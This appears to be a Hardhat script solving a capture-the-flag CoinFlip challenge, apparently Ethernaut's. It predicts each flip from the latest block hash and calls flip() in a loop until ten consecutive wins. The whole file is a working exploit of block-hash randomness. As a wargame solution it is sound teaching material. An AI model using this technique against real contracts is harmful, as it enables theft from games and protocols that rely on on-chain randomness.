// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
import { BigNumber } from "ethers";
import { ethers } from "hardhat";
const { abi } = require("../abis/CoinFlip.json");

async function main() {
  const coinFlip = await ethers.getContractAt(
    abi,
    "0xC83410b2F301d5A2122b75711f86f1f682fb0a34"
  );
  const factor = BigNumber.from(
    "57896044618658097711785492504343953926634992332820282019728792003956564819968"
  );
  let consecutiveWins = Number(await coinFlip.consecutiveWins());
  while (consecutiveWins !== 10) {
    const block = await ethers.provider.getBlock("latest");
    console.log(`getting block ${block.number}`);
    const blockValue = block.hash;
    const blockValueNumber = BigNumber.from(blockValue);
    const result = blockValueNumber.div(factor);
    console.log(`using result ${result.eq(1)}`);
    await (await coinFlip.flip(result.eq(1))).wait();
    if ((await coinFlip.consecutiveWins()) > consecutiveWins) {
      console.log(`we won! we're up to ${consecutiveWins} wins.`);
      consecutiveWins = Number(consecutiveWins) + 1;
    } else {
      console.log(`bad luck loss`);
      consecutiveWins = 0;
    }
  }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
